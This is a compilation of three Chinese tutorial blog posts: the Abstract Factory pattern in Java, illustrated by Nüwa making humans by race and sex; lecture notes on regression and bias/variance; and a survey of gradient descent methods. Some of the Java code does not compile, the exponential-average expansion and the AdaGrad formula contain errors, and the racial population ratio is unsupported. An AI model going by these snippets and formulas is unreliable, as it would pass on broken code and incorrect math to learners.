  //黄人男性
  public void getSex(){
    System.put.println("黄人男性");
  }
}

其他的黑色人种、白色人种的男性和女性的代码与此类似，不再重复编写。剩下的工作就是创造人口。接口HumanFactory代码如下：

//八卦炉定义
public interface HumanFactory{
  //创造一个黄色人种
  public Human createYellowHuman();
  //创造一个白色人种
  public Human createWhiteHuman();
  //创造一个黑色人种
  public Human createBlackHuman();
}

女性与男性的八卦炉代码分别如下：

//生产女性的八卦炉
public class FemaleFactory implements HumanFactory{
  //生产出黑人女性
  public Human createBlackHuman(){
    return new FemaleBlackHuman();
  }
  //生产出白人女性
  public Human createWhiteHuman(){
    return new FemaleWhiteHuman();
  }
  //生产出黄人女性
  public Human createYellowHuman(){
    return new FemaleYellowHuman();
  }
}

//生产男性的八卦炉
public class MaleFactory implements HumanFactory{
  //生产出黑人男性
  public Human createBlackHuman(){
    return new MaleBlackHuman();
  }
  //生产出白人男性
  public Human createWhiteHuman(){
    return new MaleWhiteHuman();
  }
  //生产出黄人男性
  public Human createYellowHuman(){
    return new MaleYellowHuman();
  }
}

人种有了，八卦炉也有了，重现造人光景，代码如下:

//女娲重造人类
public class NvWa{
  public static void main(String[] args){
    //第一条生产线，男性生产线
    HumanFactory maleHumanFactory = new MaleFactory();
    //第二条生产线，女性生产线
    HumanFactory femaleHumanFactory = new FemaleFactory();
    //生产线建立完毕，开始生产人
    Human maleYellowHuman = maleHumanFactory.createYellowHuman();
    Human femaleYellowHuman = femaleHumanFactory.createYellowHuman();
    //生产第一个女性
    System.out.println("生产一个黄色女性");
    femaleYellowHuman.getColor();
    femaleYellowHuman.talk();
    femaleYellowHuman.getSex();
     System.out.println("生产一个黄色男性");
    maleYellowHuman.getColor();
    maleYellowHuman.talk();
    maleYellowHuman.getSex();
  }
}

结果：

运行结果如下所示： 生产一个黄色女性 黄色人种的皮肤颜色是黄色的！ 黄色人种会说话， 一般说的都是双字节。 黄人女性 生产一个黄色男性 黄色人种的皮肤颜色是黄色的！ 黄色人种会说话， 一般说的都是双字节。 黄人男性

这种模式就类似于现实世界中的工厂，每个工厂分很多车间， 每个车间又分多条生产线， 分别生产不同的产品， 我们可以把八卦炉比喻为车间， 把八卦炉生产的工艺（生产白人、 黑人还是黄人） 称为生产线， 如此来看就是一个女性生产车间， 专门生产各种肤色的女性， 一个是男性生产车间， 专门生产各种肤色男性， 生产完毕就可以在系统外组装。在这样的设计下，各个车间和各条生产线的职责非常明确， 在车间内各个生产出来的产品可以有耦合关系， 你要知道世界上黑、 黄、 白人种的比例是： 1∶4∶6， 那这就需要女娲娘娘在烧制的时候就要做好比例分配， 在一个车间内协调好。 这就是抽象工厂模式 。
3.1抽象工厂模式的定义
抽象工厂模式(Abstract Factory Pattern)是一种比较常用的模式，其定义如下：
Provide an interface for creating families of related or dependent objects without specifying their concrete class.(为创建一组相关或相互依赖的对象提供一个接口，并且无需指定它们的具体类)
抽象工厂模式的通用类图如下：

3.2抽象工厂模式的使用场景
抽象工厂的使用场景定义非常简单：一个对象族(或是一组没有任何关系的对象)都有相同的约束，则可以使用抽象工厂模式。例如一个文本编辑器和一个图片处理器，都是软件实体，但是*nix下的文本编辑器和Windows下的文本编辑器虽然功能和界面都相同，但是代码实现是不同的，图片处理器也有类似的情况。也就是具有了共同的约束条件：操作系统类型。于是我们可以使用抽象工厂模式，产生不同操作系统下的编辑器和图片处理器。
3.3抽象工厂的优点
封装性：每个产品的实现类不是高层模块要关心的，它关心的是接口，是抽象，它不关心对象是任何创建出来的，对象的创建是由工厂类来负责的，只要知道工厂类是谁，就能创建出一个需要uti的的对象，省时省力，优秀设计也应该如此。
产品族内的约束为非公开状态：例如生产男女比例的问题上，猜想女娲娘娘肯定有自己的打算，不能让女盛男衰，否则女性的优点就体现不出来了。那在抽象工厂模式，就应该有这样的一个约束：没生产1个女性，就同时生产出1.2个男性，这样的生产过程对调用工厂类的高层模块来说是透明的，它不需要知道这个约束，我就是要要一个黄色女性产品就可以了，具体的产品族内的约束是在工厂内实现的。
3.4抽象工厂的缺点
抽象工厂模式的最大缺点就是产品族的扩展非常困难，我们以通用代码为例。如果要增加一个产品C，也就是说产品家族由原来的2个增加到3个，程序的改造如下：
抽象类AbstractCreator要增加一个方法createProduct()，然后两个实现类都要修改，想想看，这严重违反了开闭原则，而且我们一直说明抽象类和接口是一个契约。改变契约，所有契约有关系的代码都要修改，那么这段代码叫什么？叫“有毒代码”，——只要与这段代码有关系，就可能产生侵害的危险。
3.5抽象工厂代码实现
抽象工厂是工厂方法模式的升级版本，在有多个业务品种、业务分类时，通过抽象工厂模式产生需要的对象是一种非常好的解决方式。通过抽象工厂的通用源代码，可以看出首先要有两个相互影响的产品线(也叫产品族)，例如制造汽车的左侧门和右侧门，这两个应该是数量相等的——两个对象之间的约束，每个型号的车门都是不一样的，这是产品等级结构约束的，如下为两个产品族的类图：

注意类图上的圈圈、框框相对应，两个抽象产品类可以有关系，例如共同继承或者实现一个抽象类或接口，其代码如下：

//抽象产品类
public abstract class AbstractProductA{
  //每个产品共有的方法
  public void shareMethod(){
  }
  //每个产品相同方法，不同实现
  public abstract void doSomething();
}

两个具体的产品实现类代码如下：

//产品A1的实现类
public class ProductA1 extends AbstractProductA{
  public void doSomething(){
    System.out.println("产品A1的实现方法");
  }
}

//产品A2的实现类
public class ProductA2 extends AbstractProductA{
  public void doSomething(){
    System.out.println("产品A2的实现方法");
  }
}

产品B与此类似，抽象工厂类AbstractCreator的职责是定义每个工厂要实现的功能，在通用代码中，抽象工厂类定义了两个产品族的产品创建。代码如下：

//抽象工厂类
public abstract class AbstractCreator{
  //创建A产品家族
  public abstract AbstractProductA createProductA();
  //创建产品B家族
  public abstract AbstractProductB createProductB();
}

创建一个产品，则有具体的实现类来完成，Creator1和Creator2代码如下：

//产品等级1的实现
public class Creator1 extends AbstractCreator{
  //只生产产品等级为1的A产品
  public AbstractProductA createProductA(){
    return new ProductA1();
  }
   //只生产产品等级为1的B产品
  public AbstractProductB createProductB(){
    return new ProductB1();
  }
}

//产品等级2的实现
public class Creator2 extends AbstractCreator{
  //只生产产品等级为2的A产品
  public AbstractProductA createProductA(){
    return new ProductA2();
  }
   //只生产产品等级为2的B产品
  public AbstractProductB createProductB(){
    return new ProductB2();
  }
}

场景类的代码如下：

//场景类
public class Client{
  public static void main(String[] args){
    //定义两个工厂
    AbstractCreator creator1 = new Creator();
    AbstractCreator creator2 = new Creator();
    //产生A1对象
    AbstractProductA a1 = creator1.createProductA();
    //产生A2对象
    AbstractProductA a2 = creator2.createProductA();
     //产生B1对象
    AbstractProductB b1 = creator1.createProductB();
    //产生B2对象
    AbstractProductA b2 = creator2.createProductB();
    //具体操作。。。
  }
}

在场景类中，没有任何一个方法与实现类有关系，对于一个产品来说，我们只要知道它的工厂方法就可以直接产生一个产品对象，无需关心它的实现类。
3.6抽象工厂模式的注意事项
在抽象工厂模式的缺点中，我们提到抽象工厂模式的产品族扩展比较困难，但是一定要清楚，是产品族扩展困难，而不是产品等级。在该模式下，产品等级是非常容易扩展的，增加一个产品等级，只要增加一个工厂类负责新增加出来的产品生产任务即可。也就是说横向扩展容易，纵向扩展困难。以人类为例子，产品等级中只有男、女两个性别，现实世界还有一种性别：双性人，既是男人也是女人(俗语就是阴阳人)，那我们要扩展这个产品等级也是非常容易的，增加三个产品类，分别对应不同的肤色，然后在创建一个工厂类。专门负责不同肤色人的双性人的创建任务，完全通过扩展来实现需求的变更，从这一点上看，抽象工厂模式是符合开闭原则的。
 
********************************************************************************************************************************************************************************************************
李宏毅机器学习笔记1：Regression、Error
李宏毅老师的机器学习课程和吴恩达老师的机器学习课程都是都是ML和DL非常好的入门资料，在YouTube、网易云课堂、B站都能观看到相应的课程视频，接下来这一系列的博客我都将记录老师上课的笔记以及自己对这些知识内容的理解与补充。(本笔记配合李宏毅老师的视频一起使用效果更佳！）
今天这篇文章的主要内容是第1-2课的笔记。
ML Lecture 1: Regression - Demo
1.Machine Learning最主要有三个步骤：(1)选择a set of function,也就是选择一个合适的model。(2)评价你选择的function。:因为有许多的函数，我们要通过一个确定的方式去挑选出最好的函数，通常我们用loss function 去评价一个函数的好坏。(3)通过评价和测试，选择出Best function。
2.课程中提供的主要例子是预测宝可梦进化后的CP值，一只宝可梦可由5个参数表示，x=(x_cp, x_s, x_hp, x_w, x_h)。我们在选择 model 的时候先选择linear model。接下来评价goodness of function ，它类似于函数的函数，我们输入一个函数，输出的是how bad it is，这就需要定义一个loss function。在所选的model中，随着参数的不同，有着无数个function（即，model确定之后，function是由参数所决定的），每个function都有其loss，选择best function即是选择loss最小的function（参数），求解最优参数的方法可以是gradient descent!
3.gradient descent 的步骤是:(1)随机初始化参数。(2)再向损失函数对参数的负梯度方向迭代更新。(3)learning rate控制步子大小、学习速度。梯度方向是损失函数等高线的法线方向。
4.gradient descent可能带来的问题：(1)得到的是局部最小值，而不是全局最小值。(2)若存在鞍点，也不容易得到最佳解。不过在线性回归中利用梯度下降算法得到的解一定是全局最小值，因为线性回归中的损失函数是凸的。(有关梯度下降的原理、分类等具体看下一篇文章)
5.很容易想到，刚刚我们用了一次方程作为model，二次方程会不会更好一些呢，三次方程、四次方程呢？于是我们做了以下实验，用同样的方法，放到多次方程中。
6.通过上面四幅图可以看出，虽然当我们增加函数次数时，可以使training data的Average Error越来越小，但是Test data的表现却不尽如人意，甚至在五次方程时，大大超出了我们的预估，那么这种现象就叫做overfitting。在得到best function之后，我们真正在意的是它在testing data上的表现。选择不同的model，会得到不同 的best function，它们在testing data 上有不同表现。复杂模型的model space涵盖了简单模型的model space，因此在training data上的错误率更小，但并不意味着在testing data 上错误率更小。模型太复杂会出现overfitting。
7.解决Overfitting的两种方法：(1)Redesign the Model Again。(2)Regularization,对线性模型来讲，希望选出的best function 能 smooth一些，也就是权重系数小一些，因为这样的话，在测试数据受噪声影响时，预测值所受的影响会更小。 所以在损失函数中加一个正则项 λΣ(w_i)^2。 越大的λ，对training error影响不大，主要是用于降低testing error, 我们希望函数smooth，但也不能太smooth。 调整λ，选择使testing error最小的λ.如下图所示
 
 ML Lecture 2: Where does the error come from?
1.error主要有两种来源：(1)bias(偏差)。(2)variance(方差）
2.对于bias和variance的个人理解：
（1）bias ：度量了某种学习算法的平均估计结果所能逼近学习目标的程度；（一个高的偏差意味着一个坏的匹配） 　　  variance ：则度量了在面对同样规模的不同训练集时分散程度。（一个高的方差意味着一个弱的匹配，数据比较分散）
 
（2）如上图所示，靶心为某个能完美预测的模型，离靶心越远，则准确率随之降低。靶上的点代表某次对某个数据集上学习某个模型。纵向上，高低的bias：高的Bias表示离目标较远，低bias表示离靶心越近；横向上，高低的variance，高的variance表示多次的“学习过程”越分散，反之越集中。 所以bias表示预测值的均值与实际值的差值；而variance表示预测结果作为一个随机变量时的方差。
3.简单模型，variance小。复杂模型，variance大。（简单模型更少受训练数据影响。复杂模型会尽力去拟合训练数据的变化。） 
bias代表f¯与 f^的距离。简单模型，bias大。复杂模型，bias小。 
simple model的model space较小，可能没有包含target。
在underfitting的情况下，error大部分来自bias。 
在overfitting的情况下，error大部分来自variance。
如果model连训练样本都fit得不好，那就是underfitting, bias大。 
如果model可以fit训练样本，但是testing error大，那就是overfitting, variance大。
4.解决bias与variance偏大问题：在bias大的情况下，需要重新设计model，比如增加更多的feature，或者让model更complex。而此时more data是没有帮助的。 在variance大的情况下，需要more data，或者regularization。more data指的是，之前100个f∗，每个f∗抓10只宝可梦，现在还是100个f∗，每个f∗抓100只宝可梦。more data很有效，但不一定可行。regularization希望曲线平滑，但它可能伤害bias，造成model space无法包含target f^。在选择模型时，要考虑两种error的折中，使total error最小。或者在训练数据上面，我们可以进行交叉验证(Cross-Validation)。
5.bias与Variance的区别：首先 Error = Bias + Variance Error反映的是整个模型的准确度，Bias反映的是模型在样本上的输出与真实值之间的误差，即模型本身的精准度，Variance反映的是模型每一次输出结果与模型输出期望（平均值）之间的误差，即模型的稳定性，数据是否集中。方差是多个模型间的比较，而非对一个模型而言的；偏差可以是单个数据集中的，也可以是多个数据集中的。
 
参考：https://blog.csdn.net/qq_16365849/article/details/50635700
 
********************************************************************************************************************************************************************************************************
一文搞懂深度学习中的梯度下降
本文算是对常用梯度图下降的算法综述，从方向导数开始得到梯度下降的原始算法，接着描述了动量梯度下降算法。 而由于超参数学习率对梯度下降的重要性，所以梯度算法就有多个自适应梯度下降算法。 主要有以下内容：

方向导数和梯度下降
梯度下降的形式，批量梯度下降，SGD以及mini-batch 梯度下降
梯度下降的进化，主要是几种自适应梯度下降算法：AdaGrad,RMSprop,AdaDelta,Adam

方向导数和梯度
方向导数
方向导数指的是函数\(z=f(x,y)\)在某一点\(P\)沿某一方向的变化率，其表示形式为\[\frac{\partial f}{\partial l}\]其中\(l\)表示变换的方向。
设函数\(z=f(x,y)\)在点\(P(x,y)\)的某一邻域\(U(p)\)内有定义。自点\(P\)处引射线\(l\)，设射线\(l\)和\(X\)轴正向的夹角为\(\theta\)，并且假定射线\(l\)与函数\(z = f(x,y)\)的交点为\(P'(x+\Delta x,y + \Delta y)\)。则函数在\(P,P'\)的增量为\(f(x+\Delta x , y + \Delta y) - f(x,y)\)，两点之间的距离为\(\rho = \sqrt{(\Delta x)^2 + (\Delta y)^2}\)，当\(P'\)沿着\(l\)趋近于\(P\)时，如果函数增量和两点距离的比值的极限存在，则称这个极限为函数\(f(x,y)\)在点\(P\)沿方向\(l\)的方向导数，记为\(\frac{\partial f}{\partial l}\)，即
\[
\frac{\partial f}{\partial l} = \lim_{\rho \rightarrow 0} \frac{f(x+\Delta x , y + \Delta y) - f(x,y)}{\rho}
\]
假设，函数\(z=f(x,y)\)在点\(P(x,y)\)可微，则有：
\[
f(x + \Delta x,y + \Delta y) - f(x,y) = \frac{\partial f}{\partial x} \cdot \Delta x + \frac{\partial f}{\partial y}\cdot \Delta y + o(\rho)
\]
将上式的左右两边同时除以\(\rho\)
\[
\frac{f(x + \Delta x,y + \Delta y) - f(x,y)}{\rho} = \frac{\partial f}{\partial x} \cdot \cos \theta + \frac{\partial f}{\partial y}\cdot \sin \theta + \frac{o(\rho)}{\rho}
\]
取极限有
\[
\frac{\partial f}{\partial l} = \lim_{\rho \rightarrow 0} \frac{f(x+\Delta x , y + \Delta y) - f(x,y)}{\rho} = f_x \cdot \cos \theta + f_y \cdot \sin \theta
\]
梯度
梯度是和方向导数相关的一个概念。
假设函数\(z=f(x,y)\)在平面区域内\(D\)内具有一阶连续偏导数，则对每一点\((x,y) \in D\)，都可得到一个向量，
\[
\frac{\partial f}{\partial x} i + \frac{\partial f}{\partial y} j
\]
该向量就称为函数\(z=f(x,y)\)在点\((x,y)\)处的梯度，记为\(grad f(x,y)\)，即
\[
\nabla f = grad f(x,y) = \frac{\partial f}{\partial x} i + \frac{\partial f}{\partial y} j
\]
那么梯度和方向导数，有什么样的关系呢。
设，向量\(e = \cos \theta i + \sin \theta j\)是与\(l\)同向的单位向量，则有方向导数的计算公式可知，
\[
\frac{\partial f}{\partial l} = \frac{\partial f}{\partial x}  \cos \theta + \frac{\partial f}{\partial y} \sin \theta = \left [\frac{\partial f}{\partial x},\frac{\partial f}{\partial y} \right ] [\cos \theta,\sin \theta]^T = \nabla f \cdot e = \mid \nabla f \mid \cos <\nabla f,e> 
\]
$\cos <\nabla f,e> $表示梯度 \(\nabla f\) 与 \(e\)的夹角，当方向向量的方向\(l\)的方向与梯度一致时，方向导数\(\frac{\partial f}{\partial l}\)达到最大值，也就是说函数沿着梯度的方向增长最快。
函数在某点的梯度是一个向量，在该点沿着梯度方向的方向导数取得最大值，方向导数的最大值为梯度的模。
\[
\mid \nabla f \mid = \sqrt{f_x ^2 + f_y^2}
\]
梯度的方向由梯度向量相对于\(x\)轴的角度给出，
\[
\alpha(x,y) = arctan(\frac{f_y}{f_x})
\]
也就是说，一个函数在某点沿着梯度的方向增长最快，而逆着梯度的方向则减小最快。
梯度下降优化算法
在复杂函数求最小值的优化问题中，通常利用上面描述的梯度的性质，逆着梯度的方向不断下降，来找到函数的极小值。
以进行一个线性回归的批量梯度下降为例，描述下梯度下降方法的过程
\[
h_{\theta}(x^i) = \theta_1 x^i + \theta_0
\]
其目标函数为：
\[
J(\theta_0,\theta_1) = \frac{1}{2m}\sum_{i=1}^m(h_{\theta}(x^i) - y^i)^2
\]
其中,\(i = 1,2,\cdots,m\)为第\(i\)个样本。这里的目标函数是所有样本误差和的均值。
则使用梯度下降进行优化时，有以下步骤

求目标函数的导数
\[
\frac{\Delta J\left(\theta_{0}, \theta_{1}\right)}{\Delta \theta_{j}}=\frac{1}{m} \sum_{i=1}^{m}\left(h_{\theta}\left(x^{(i)}\right)-y^{(i)}\right) x_{j}^{(i)}
\]
\(i = 1,2,\cdots,m\)为样本数。
利用上述样本更新参数
\[
\theta_{j} :=\theta_{j}-\alpha \frac{1}{m} \sum_{i=1}^{m}\left(h_{\theta}\left(x^{(i)}\right)-y^{(i)}\right) x_{j}^{(i)}
\]
其中，\(\alpha\)是每次下降的步长。

梯度下降中的几个基本概念：

假设模型，上面线性回归中使用函数\(h_{\theta}(x^i) = \theta_1 x^i + \theta_0\)作为训练集的拟合函数。在深度学习中，可以将整个神经网络看着一个复杂的非线性函数，作为训练样本的拟合模型。
目标函数，也称为损失函数（loss function）。使用该函数的值来评估假设的模型的好坏，目标函数的值越小，假设模型拟合训练数据的程度就越好。使用梯度下降，实际就是求目标函数极小值的过程。上述线性回归中，使用模型预测值和真实数据的差值的平方作为目标函数\(J(\theta_0,\theta_1) = \frac{1}{2m}\sum_{i=1}^m(h_{\theta}(x^i) - y^i)^2\)，前面乘以\(\frac{1}{2}\)是为了求梯度方便。
步长\(\alpha\),超参数步长值的设定在梯度下降算法中是很重要的。目标函数的梯度只是指明了下降的方向，而步长则是每次迭代下降的距离多少。过小的步长，则会导致训练时间过长，收敛慢；而过大的步长则会导致训练震荡，而且有可能跳过极小值点，导致发散。

梯度下降的形式
梯度下降是机器学习的常用优化方法，根据每次使用的样本的数据可以将梯度下降分为三种形式：批量梯度下降（Batch Gradient Descent），随机梯度下降(Stochastic Gradient Descent)以及小批量梯度下降(Mini-batch Gradient Descent)。
以进行一个线性回归为例：
\[
h_{\theta}(x^i) = \theta_1 x^i + \theta_0
\]
其目标函数为：
\[
J(\theta_0,\theta_1) = \frac{1}{2m}\sum_{i=1}^m(h_{\theta}(x^i) - y^i)^2
\]
其中,\(i = 1,2,\cdots,m\)为第\(i\)个样本。这里的目标函数是所有样本误差和的均值。
则目标函数与参数\((\theta_0,\theta_1)\)之间关系为

在上图中，使用梯度下降的方法，求得最低位置的\((\theta_0,\theta_1)\)即为所求。
批量梯度下降
批量梯度下降是最原始的形式，它指的是每一次迭代时使用说有样本的数据进行梯度更新.

求目标函数的导数
\[
\frac{\Delta J\left(\theta_{0}, \theta_{1}\right)}{\Delta \theta_{j}}=\frac{1}{m} \sum_{i=1}^{m}\left(h_{\theta}\left(x^{(i)}\right)-y^{(i)}\right) x_{j}^{(i)}
\]
\(i = 1,2,\cdots,m\)为样本数。
利用上述样本更新参数
\[
\theta_{j} :=\theta_{j}-\alpha \frac{1}{m} \sum_{i=1}^{m}\left(h_{\theta}\left(x^{(i)}\right)-y^{(i)}\right) x_{j}^{(i)}
\]

批量梯度下降算法的优缺点都很明显：

优点 每次更是时使用了全部的样本数据，能更准确地朝向极值所在的方向。
缺点 当样本很多时，每次都是用所有的样本，训练时每轮的计算量会很大。

从迭代次数来说，批量梯度下降迭代次数较少。对于凸误差函数，批量梯度下降法能够保证收敛到全局最小值，对于非凸函数，则收敛到一个局部最小值。
随机梯度下降 SGD
不同于批量梯度下降，随机梯度下降，每次只用要给样本进行梯度更新，这样训练的速度快上不少。
其目标函数为
\[
J^{(i)}\left(\theta_{0}, \theta_{1}\right)=\frac{1}{2}\left(h_{\theta}\left(x^{(i)}\right)-y^{(i)}\right)^{2}
\]

目标函数求导
\[\frac{\Delta J^{(i)}\left(\theta_{0}, \theta_{1}\right)}{\theta_{j}}=\left(h_{\theta}\left(x^{(i)}\right)-y^{(i)}\right) x_{j}^{(i)}\]
梯度更新
\[\theta_{j} :=\theta_{j}-\alpha\left(h_{\theta}\left(x^{(i)}\right)-y^{(i)}\right) x_{j}^{(i)}\]

随机梯度下降每次只是用一个样本，其训练速度快。 但是在更新参数的时候，由于每次只有一个样本，并不能代表全部的训练样本，在训练的过程中SGD会一直的波动，这就使得要收敛某个最小值较为困难。不过，已经有证明缓慢减小学习率，SGD与批梯度下降法具有相同的收敛行为，对于非凸优化和凸优化，可以分别收敛到局部最小值和全局最小值。
小批量梯度下降，也称为随机批量梯度下降
在深度学习中，最常用的优化方法就是小批量梯度下降。 小批量下降是对批量梯度下降和随机梯度下降两种方法的中和，每次随机的使用batch_size个样本进行参数更新，也可以称为随机批量梯度下降。（batch_size是一个超参数）。

优点 算是对上面两种方法均衡，即有SGD训练快的优点，每次更新参数时使用多个样本，在训练的过程中较为稳定。
确定 batch_size是一个超参数，需要手动的指定。过大和过小的batch_size会带来一定的问题。

通常，小批量数据的大小在50到256之间，也可以根据不同的应用有所变化。在一定范围内，一般来说batch_Size越大，其确定的下降方向越准，引起训练震荡越小。但是，batch_size增大到一定程度后，其确定的下降方向并不会改变了，所以，过大的batch_size对训练精度已经帮助不大，只会增加训练的计算量。
梯度下降的难点
梯度下降的难点：

学习率的设置
极小值点，鞍点

梯度下降优化中的第一个难点就是上面提到的，学习率的设置问题。学习速率过小时收敛速度慢，而过大时导致训练震荡，而且可能会发散。
而非凸误差函数普遍出现在神经网络中，在优化这类函数时，另一个难点是梯度下降的过程中有可能陷入到局部极小值中。也有研究指出这种困难实际上并不是来自局部最小值，而更多的来自鞍点，即那些在一个维度上是递增的，而在另一个维度上是递减的。这些鞍点通常被具有相同误差的点包围，因为在任意维度上的梯度都近似为0，所以SGD很难从这些鞍点中逃开。

鞍点（Saddle point）在微分方程中，沿着某一方向是稳定的，另一条方向是不稳定的奇点，叫做鞍点。对于拥有两个以上变量的曲线，它的曲面在鞍点好像一个马鞍，在某些方向往上曲，在其他方向往下曲。由于鞍点周围的梯度都近似为0，梯度下降如果到达了鞍点就很难逃出来。下图是\(z = x^2 - y^2\)图形，在x轴方向向上曲，在y轴方向向下曲，像马鞍，鞍点为\((0,0)\)


另外，在梯度平坦的维度下降的非常慢，而在梯度较大的维度则有容易发生抖动。
梯度下降的算法的进化
理想的梯度下降算法要满足两点：收敛速度要快；而且能全局收敛。所以就有各种梯度算法的变种。
动量梯度下降
基于动量的梯度下降是根据指数加权平均来的，首先要了解下指数加权平均。
指数加权平均
指数加权平均（exponentially weighted averges），也称为指数加权移动平均，是常用的一种序列数据的处理方法。设在\(t\)时刻数据的观测值是\(\theta_t\)，在\(t\)时刻的移动平均值为\(v_t\)，则有
\[
v_t = \beta v_{t-1} + (1 - \beta)\theta_t
\]
其中，\(\beta v_{t-1}\)是上一时刻的移动平均值，也看着一个历史的积累量。通常设\(v_0 = 0\)，\(\beta\)是一个参数，其值在\((0,1)\)之间。动平均值实际是按比例合并历史量与当前观测量，将上述递推公司展开
\[
\begin{align*}
v_0 & = 0\\
v_1 & = \beta v_0 + (1-\beta)\theta_1 \\
v_2 &= \beta v_1 + (1-\beta)\theta_2  = \beta (\beta v_0 + \theta_1) + (1-\beta)\theta_2 \\
\vdots \\
v_t &= \beta v_{t-1} + (1-\beta)\theta_t = \sum_{i=1}^t \beta^{t-i}(1-\beta)\theta_t
\end{align*}
\]
展开后可以发现，在计算某时刻的\(v_t\)时，其各个时刻观测值\(\theta_t\)的权值是呈指数衰减的，离当前时刻\(t\)越近的\(\theta_t\)，其权值越大，也就是说距离当前时刻越近的观测值对求得移动平均值的影响越大，这样得到的平均值的会比较平稳。由于权重指数衰减，所以移动平均数只是计算比较相近时刻数据的加权平均数，一般认为这个时刻的范围为\(\frac{1}{1-\beta}\)，例如\(\beta=0.9\)，可以认为是使用距离当前时刻之前10时刻内的\(\theta_t\)的观测值，再往前由于权重值国小，影响较小。
指数加权平均例子
下面是伦敦一年中每天的温度，使用指数加权平均的方法，来表示其温度的变化趋势

计算其各个时刻的移动品均值，设\(\beta = 0.9\)
\[
\begin{align*}
v_0 &=0 \\
v_1 &= 0.9v_0 + 0.1\theta_1 \\
v_2 &= 0.9v_1 + 0.1 \theta_2 \\
\vdots \\
v_t & = 0.9 v_{t-1} + 0.1 \theta_t
\end{align*}
\]
将移动平均值即每日温度的指数加权平均值的曲线图

上图的 \(\beta=0.9\),也就是近10天的加权平均值。设\(\beta =0.98\)，也就是近50天的加权均值，可以得到如下曲线（绿色）

相比于红色曲线，绿色曲线更为平坦，因为使用50天的温度，所以这个曲线，波动更小，更加平坦，缺点是曲线进一步右移，因为现在平均的温度值更多，要平均更多的值，指数加权平均公式在温度变化时，适应地更缓慢一些，所以会出现一定延迟。而且\(\beta = 0.98\)给历史积累量的权值过多，而给当前量权值仅为0.02过少。
那如果平均过少的天数呢，比如\(\beta = 0.5\)只使用2天内的温度

可以看到黄色曲线波动较大，有可能出现异常值，但是这个曲线能够更快适应温度变化。
参数\(\beta\)的选择较为重要，不能过大或者国小。在本例中，\(\beta = 0.9\)取得的红色曲线，显然更能表示温度变化的趋势。
动量梯度下降
动量梯度下降算法是Boris Polyak在1964年提出的，其基于这样一个物理事实：将一个小球从山顶滚下，其初始速率很慢，但在加速度作用下速率很快增加，并最终由于阻力的存在达到一个稳定速率。
\[
\begin{align*}
m &\leftarrow \gamma \cdot m+\eta \cdot \nabla J(\theta) \\
\theta &\leftarrow \theta-m
\end{align*}
\]
可以看到，在更新权值时，不仅仅使用当前位置的梯度，还加入了一个累计项：动量，多了也给超参数\(\gamma\)。
动量梯度下降，实际上是引入了指数加权平均，在更新参数时不仅仅的只考虑当前梯度的值，还要考虑前几次梯度的值。
\[
\begin{align*}
v_t &= \beta v_{t - 1} + (1 - \beta) \nabla J(\theta)_t \\
\theta &= \theta - \alpha v_t
\end{align*}
\]
将学习速率\(\alpha\)整合到第一个式子中，更简洁一些
\[
\begin{align*}
v_t &= \gamma v_{t - 1} + \eta \nabla J(\theta)_t \\
\theta &= \theta -  v_t
\end{align*}
\]
在进行参数更新时，使用当前的\(v_t\)移动平均值来代替当前的梯度，进行参数更新。所谓的动量，也就是近几次的梯度加权移动平均。例如，通常有\(\beta = 0.9\)，也就是当前时刻最近的10次梯度做加权平均，然后用次平均值更新参数。
如下图，红点代表最小值的位置

原始的梯度下降算法，会在纵轴上不断的摆动，这种波动就就减慢了梯度下降的速度。理想情况是，在纵轴上希望学习的慢一点，而在横轴上则要学习的快一点，尽快的达到最小值。 要解决这个问题有两种思路：

纵轴方向和横轴方向设置不同的学习率，这是自适应学习速率算法的方法。后面会说到，这里先不提。
带动量的梯度下降。

如上图，在纵轴方向其每次的梯度摇摆不定，引入动量后，每次使用一段时间的梯度的平均值，这样不同方向的梯度就会相互抵消，从而减缓纵轴方向的波动。而在，横轴方向，由于每次梯度的方向都指向同一个位置，引入动量后，其平均后的均值仍然指向同一个方向，并不会影响其下降的速度。
动量梯度下降，每一次梯度下降都会累积之前的速度的作用，如果这次的梯度方向与之前相同，则会因为之前的速度继续加速；如果这次的方向与之前相反，则会由于之前存在速度的作用不会产生一个急转弯，而是尽量把路线向一条直线拉过去，这样就减缓的波动。
Nesterov Accelerated Gradient,NAG
球从山上滚下的时候，盲目地沿着斜率方向，往往并不能令人满意。我们希望有一个智能的球，这个球能够知道它将要去哪，以至于在重新遇到斜率上升时能够知道减速。
NAG算法是Yurii Nesterov在1983年提出的对冲量梯度下降算法的改进版本，其速度更快。其变化之处在于计算“超前梯度”更新冲量项。
在动量梯度下降中，使用动量项\(\gamma v_{t-1}\)来更新参数\(\theta\)，通过计算\(\theta - \gamma v_{t-1}\)能够大体预测更新后参数所在的位置，也就是参数大致将更新为多少。通过计算关于参数未来的近似位置的梯度，而不是关于当前的参数的梯度位置
\[
\begin{align*}
v_t &= \gamma v_{t -1 } + \eta \nabla J(\theta - \gamma v_{t-1}) \\
\theta &= \theta - v_t
\end{align*}
\]
如下图

动量梯度下降，首先计算当前的梯度项，上图的蓝色小向量；然后加上累积的动量项，得到大蓝色向量，在改方向上前进一步。
NAG则首先在之前累积的动量项（棕色向量)前进一步，计算梯度值，然后做一个修正（绿色的向量）。这个具有预见性的更新防止我们前进得太快，同时增强了算法的响应能力。
直观想象下这个过程，就像骑一辆自行车向下冲。一般的动量下降，就像骑到某一个地方，然后根据当前的坡度，决定往那个方向拐。而NAG则是首先判断下前方的坡度，然后根据前方的坡度决定往那个方向拐。也就是预判下一个位置的坡度，对当前下降的方向进行修正，避免走冤枉路。
AdaGrad
在基本的梯度优化算法中，有个常见问题是，要优化的变量对于目标函数的依赖是不相同的。有些变量，已经优化到极小值附近，但是有些变量仍然离极小值很远，位于梯度较大的地方。这时候如果对所有的变量都使用同一个全局的优学习速率就有可能出现问题，学习率太小，则梯度很大的变量就会收敛的很慢；如果梯度很大，已经优化的差不多的变量可能会不稳定。
针对这个问题，Jhon Duchi提出了AdaGrad(Adaptive Gradient)，自适应学习速率。AdaGrad的基本思想是对每个变量使用不同的学习率。在最初，学习速率较大，用于快速下降。随着优化过程的进行，对于已经下降很多的变量，则减小学习率；对于没有怎么下降的变量，则仍保持大的学习率。
AdaGrad对每个变量更新时，利用该变量历史积累的梯度来修正其学习速率。这样，已经下降的很多的变量则会有小的学习率，而下降较少的变量则仍然保持较大的学习率。基于这个更新规则，其针对变量\(\theta_i\)的更新
\[
\theta_{(t+1,i)} = \theta_{(t,i)} - \frac{\eta}{\sqrt {\sum_{\tau =1}^t \nabla J(\theta_i)_\tau + \epsilon}} \cdot \nabla J(\theta_i)_{t+1}
\]
